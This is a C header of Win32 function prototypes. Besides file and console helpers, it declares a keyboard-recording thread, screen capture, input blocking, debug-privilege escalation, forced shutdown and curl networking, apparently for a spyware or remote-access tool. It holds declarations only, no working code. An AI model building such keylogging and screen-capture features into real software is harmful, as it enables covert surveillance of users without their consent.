#ifndef WIN_MSC
#define WIN_MSC

#include <wchar.h>
#include <stdint.h>
#include "types.h"

void *      GetPolicyHandle();
void        ClosePolicyHandle(void * handle);
wchar_t *   GetCurrentUserName(size_t * chars);
boolean     EnableDebugPrivelege(void*, void*);
void        EnumAllPrivileges(void * pHandle, void * acc_sid);
extern int  CreateKeyBoardRecordingThread();


int         InitCurl();
void        DestroyCurl();

time_t      GetRunningTime();
uint32_t    GetLastErrorWin32();
char *      GetDesktopName();
long        GetProcessorCount();
boolean     TurnComputerOffWin32();
void        BlockInputWin32(boolean);
void        SetNoErrorWin32();
void        SetLastErrorWin32(uint32_t c);
boolean     HasErrorWin32();
char *      CaptureScreen(size_t * bytes);
void *      CreateFileWin32(const wchar_t * fileName);
boolean     IsFileValidWin32(const void *handle);
uint32_t    WriteFileWin32(const void * data, uint32_t length, void *file);
uint32_t    WriteFileWin32_ascii(char value, void *file);
uint32_t WriteFileWin32_unicode(const wchar_t value, void *file);
void CloseFileWin32(void *file);

boolean IsFileExistsWin32(const wchar_t *fileName);

void *OpenFileWithAppendWin32(const wchar_t *filename);

void *OpenFileWin32(const wchar_t *filename);


char *ReadFileAllWin32(void *fileHandle, size_t *out_siz);

wchar_t *   GetTempFolderPathWin32();

int32_t Win32WriteStdout(const char *data);

int32_t Win32WriteUnicode(const wchar_t *data);

#endif